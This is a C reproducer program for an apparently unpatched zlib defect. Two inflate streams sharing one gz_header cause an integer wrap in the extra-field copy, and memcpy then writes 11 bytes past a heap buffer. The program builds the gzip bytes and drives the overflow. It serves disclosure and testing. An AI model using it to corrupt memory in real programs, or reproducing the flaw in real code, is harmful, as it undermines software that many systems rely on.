/* Open defect, no patch. Two inflate streams share one gz_header: with argument "copy", stream A registers it with
 * inflateGetHeader before its first inflate and inflateCopy copies A (with the header pointer) to B; with argument
 * "two", A and B each register it before their first inflate. The header's extra buffer holds extra_max = 2^32 - 1
 * bytes. A reads a gzip header up to an extra field of 100 bytes (head->extra_len = 100, state->length = 100), B
 * then reads its own extra length of 10 (head->extra_len = 10). When A copies its extra field, state EXTRA
 * computes len = extra_len - length = 10 - 100, which wraps to 2^32 - 90 < extra_max, and len + copy = 2^32 + 10
 * wraps to 10 <= extra_max, so memcpy writes 100 bytes at extra + 2^32 - 90: 11 bytes past the end of the buffer.
 * Every call is one that zlib.h documents. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "zlib.h"
static unsigned char out[64];
static int feed(z_stream *s, unsigned char *in, unsigned n) {
  s->next_in = in;
  s->avail_in = n;
  s->next_out = out;
  s->avail_out = sizeof out;
  return inflate(s, Z_NO_FLUSH);
}
int main(int argc, char **argv) {
  int two = argc > 1 && strcmp(argv[1], "two") == 0;
  unsigned char hdr[10] = {0x1f, 0x8b, 8, 4, 0, 0, 0, 0, 0, 3}; /* gzip, FEXTRA */
  unsigned char lenA[2] = {100, 0}, lenB[2] = {10, 0}, data[100];
  memset(data, 'x', sizeof data);
  gz_header g;
  memset(&g, 0, sizeof g);
  g.extra_max = 0xffffffffu;
  g.extra = malloc(g.extra_max);
  if (g.extra == NULL) return 2;
  z_stream a, b;
  memset(&a, 0, sizeof a);
  memset(&b, 0, sizeof b);
  if (inflateInit2(&a, 31) != Z_OK || inflateGetHeader(&a, &g) != Z_OK) return 2;
  if (two) {
    if (inflateInit2(&b, 31) != Z_OK || inflateGetHeader(&b, &g) != Z_OK) return 2;
    if (feed(&b, hdr, sizeof hdr) != Z_OK) return 2;
  }
  if (feed(&a, hdr, sizeof hdr) != Z_OK) return 2;        /* A waits for the extra length (EXLEN) */
  if (!two && inflateCopy(&b, &a) != Z_OK) return 2;      /* B: same state, same header pointer */
  if (feed(&a, lenA, sizeof lenA) != Z_OK) return 2;      /* A: extra_len = 100, in EXTRA */
  if (feed(&b, lenB, sizeof lenB) != Z_OK) return 2;      /* B: extra_len = 10 */
  int r = feed(&a, data, sizeof data);                    /* A copies its extra field */
  printf("inflate %d\n", r);
  inflateEnd(&a);
  inflateEnd(&b);
  free(g.extra);
  return 0;
}
